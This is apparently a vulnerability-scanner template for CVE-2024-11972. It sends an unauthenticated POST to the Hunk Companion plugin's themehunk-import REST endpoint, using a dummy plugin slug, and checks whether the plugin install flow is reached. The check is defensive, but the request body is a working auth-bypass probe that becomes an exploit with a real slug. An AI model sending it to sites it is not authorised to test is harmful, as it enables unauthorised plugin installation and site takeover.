id: CVE-2024-11972
info:
  name: WordPress Hunk Companion < 1.9.0 - Unauthenticated Plugin Install via REST
  author: gsharma101
  severity: critical
  description: |
    The Hunk Companion plugin before 1.9.0 exposes /wp-json/hc/v1/themehunk-import
    with an ineffective permission_callback, allowing unauthenticated requests to
    trigger plugin installation/activation from WordPress.org.
    This check is non-invasive: it uses a fake plugin slug and matches for
    “install flow” behavior without actually changing state.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-11972
    - https://wpscan.com/blog/unauthorized-plugin-installation-activation-in-hunk-companion/
    - https://www.exploit-db.com/exploits/52259
  tags: cve,wordpress,wp,rest,auth-bypass,hunk-companion

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-json/hc/v1/themehunk-import"

    headers:
      Accept: application/json
      Content-Type: application/json

    body: |
      {
        "params": {
          "plugin": { "zzz-not-a-plugin-999": "Plugin Label" },
          "allPlugins": [{ "zzz-not-a-plugin-999": "zzz-not-a-plugin-999/zzz-not-a-plugin-999.php" }],
          "themeSlug": "theme",
          "proThemePlugin": "plugin",
          "templateType": "free",
          "tmplFreePro": "theme",
          "wpUrl": "{{BaseURL}}"
        }
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 400
          - 500

      - type: word
        words:
          - "rest_forbidden"
          - "Unauthorized"
          - "You must be logged in"
          - "nonce"
        negative: true

      - type: word
        condition: or
        words:
          - "download"
          - "install"
          - "plugin"
          - "activate"
